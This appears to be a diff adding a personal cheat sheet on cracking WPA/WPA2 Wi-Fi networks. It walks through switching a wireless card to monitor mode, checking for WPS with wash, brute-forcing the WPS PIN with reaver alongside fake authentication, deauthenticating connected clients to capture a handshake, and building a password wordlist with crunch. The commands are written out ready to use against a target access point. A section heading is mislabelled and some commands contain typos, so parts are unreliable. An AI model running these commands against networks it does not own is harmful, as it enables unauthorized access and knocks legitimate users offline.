@@ -1,0 +1,51 @@
+WIfi hacking WPA/WPA2
+
+WPA/WPA2 CRACKING
+• Both can be cracked using the same methods
+• Made to address the issues in WEP.
+• Much more secure.
+• Each packet is encrypted using a unique temporary key.
+→ Packets contain no useful information.
+
+ARP REQUEST REPLAY
+• WPS is a feature that can be used with WPA & WPA2.
+• Allows clients to connect without the password.
+• Authentication is done using an 8 digit pin.
+    → 8 Digits is very small.
+    → We can try all possible pins in relatively short time.
+    → Then the WPS pin can be used to compute the actual password.
+    
+PS: This only works if the router is configured not to use PBC (Push        Button Authentication).
+
+//Managed || Monitor mode (Promicious mode OR shealth mode)
+**CMD
+iwconfig (Check interface mode)
+ifconfig wlan0 down
+airmon-ng check kill
+iwconnfig wlan0 mode monitor
+ifconfig wlan0 up
+iwconfig (check interface mode)
+
+//Check that router is enable WPS
+wash --interface wlan0mon(Interface name)
+
+    → LCK = No (Target is using WPS)
+    → LCK = yes (Target WPS is locked)
+
+aireplay-ng --fakeauth 30 -a {AP Mac} -h {OWN wireless Mac address} wlan0mon 
+reaver --bssid {AP Mac} --channel 1 --interface wlan0 -vvv --no-associate
+ NOTE:- run both cmd different terminal at same time
+
+//Capture Handshake
+airodump-ng --bssid {AP Mac} --channel 1 --write filename wlan0mon
+aireplay-ng --deauth 4 -a {AP mac} -c {connect mac} wlan0mon 
+
+//Create Wordlist Using Crunch 
+Crunch [Min] [max] [characters] -t [pattern] -o [fileame]
+crunch 6 8 123abc$ -t a@@@@b -o Wordlist 
+
+example :- aaaaab, a123bb, etc.
+
+
+
+
